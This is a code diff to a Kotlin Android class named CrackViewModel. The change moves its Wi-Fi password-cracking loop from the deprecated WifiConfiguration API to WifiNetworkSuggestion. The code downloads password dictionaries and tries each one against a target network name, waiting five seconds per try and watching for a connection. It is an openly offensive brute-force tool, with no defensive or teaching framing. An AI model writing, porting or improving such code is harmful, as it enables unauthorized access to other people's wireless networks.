@@ -6,8 +6,8 @@ import android.net.ConnectivityManager
 import android.net.Network
 import android.net.NetworkCapabilities
 import android.net.NetworkRequest
-import android.net.wifi.WifiConfiguration
 import android.net.wifi.WifiManager
+import android.net.wifi.WifiNetworkSuggestion
 import androidx.lifecycle.AndroidViewModel
 import androidx.lifecycle.viewModelScope
 import kotlinx.coroutines.Dispatchers
@@ -28,6 +28,8 @@ class CrackViewModel(application: Application) : AndroidViewModel(application) {
     val progress: StateFlow<Int> = _progress
 
     private val wifiManager = application.getSystemService(Context.WIFI_SERVICE) as WifiManager
+    private val connectivityManager =
+        application.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
 
     fun startCracking(ssid: String, detail: String) {
         viewModelScope.launch(Dispatchers.IO) {
@@ -35,17 +37,21 @@ class CrackViewModel(application: Application) : AndroidViewModel(application) {
             val passwords = downloadDictionaries()
             _status.value = "Passwords loaded, cracking now..."
 
-            val wifiConfig = WifiConfiguration()
-            wifiConfig.SSID = String.format("\"%s\"", ssid)
-
             for ((index, password) in passwords.withIndex()) {
                 _progress.value = index * 100 / passwords.size
-                wifiConfig.preSharedKey = String.format("\"%s\"", password)
-                val netId = wifiManager.addNetwork(wifiConfig)
-                wifiManager.disconnect()
-                wifiManager.enableNetwork(netId, true)
+                val suggestion = WifiNetworkSuggestion.Builder()
+                    .setSsid(ssid)
+                    .setWpa2Passphrase(password)
+                    .build()
+
+                val suggestions = listOf(suggestion)
+                val status = wifiManager.addNetworkSuggestions(suggestions)
+                if (status != WifiManager.STATUS_NETWORK_SUGGESTIONS_SUCCESS) {
+                    _status.value = "Failed to suggest network"
+                    return@launch
+                }
+
                 registerNetworkCallback(password)
-                wifiManager.reconnect()
                 kotlinx.coroutines.delay(5000) // 5 second timeout for each password
             }
             _status.value = "Failed to crack password."
@@ -53,7 +59,6 @@ class CrackViewModel(application: Application) : AndroidViewModel(application) {
     }
 
     private fun registerNetworkCallback(password: String) {
-        val connectivityManager = getApplication<Application>().getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
         val networkRequest = NetworkRequest.Builder()
             .addTransportType(NetworkCapabilities.TRANSPORT_WIFI)
             .build()
